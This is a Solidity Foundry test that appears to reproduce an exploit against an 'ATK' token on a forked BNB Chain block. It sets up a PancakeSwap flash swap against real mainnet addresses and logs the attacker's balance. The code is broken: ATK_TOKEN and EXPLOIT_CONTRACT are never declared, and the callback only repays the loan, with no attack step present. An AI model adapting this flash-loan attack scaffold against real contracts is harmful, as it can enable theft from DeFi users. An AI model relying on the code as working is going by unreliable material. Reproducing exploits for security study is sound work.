// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is Test {
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 constant router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 constant Pair = Uni_Pair_V2(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);

    uint256 swapamount;

    function setUp() public {
        vm.createSelectFork("bsc", 22_102_838);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker ATK balance before exploit", ATK_TOKEN.balanceOf(EXPLOIT_CONTRACT), 18);
        swapamount = 3 * 1e18;
        Pair.swap(swapamount, 0, address(this), new bytes(1));
        emit log_named_decimal_uint("[End] Attacker ATK balance after exploit", ATK_TOKEN.balanceOf(EXPLOIT_CONTRACT), 18);
    }

    function pancakeCall(
        address, /*sender*/
        uint256, /*amount0*/
        uint256, /*amount1*/
        bytes calldata /*data*/
    ) public {


        // repay the pair
        WBNB.transfer(address(Pair), swapamount * 10_000 / 9975 + 1000);
    }

}
